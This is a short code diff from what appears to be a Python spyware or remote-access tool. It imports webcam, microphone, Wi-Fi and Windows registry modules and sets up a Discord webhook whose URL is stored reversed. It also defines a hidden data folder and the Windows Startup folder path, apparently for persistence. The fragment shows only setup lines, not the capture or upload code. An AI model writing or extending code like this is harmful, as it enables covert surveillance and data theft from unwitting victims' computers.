@@ -24,14 +24,17 @@ import cv2
 import requests
 import sounddevice as sd
 import numpy as np
-import wavio
+import wavio 
 import threading
 import ctypes
 import winreg as wrg
 import pywifi
+import tkinter as tk
+import urllib
 
-
-webhookurl=''#URL will go here
+webhookurl=""
+wifiencoding=""
+webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
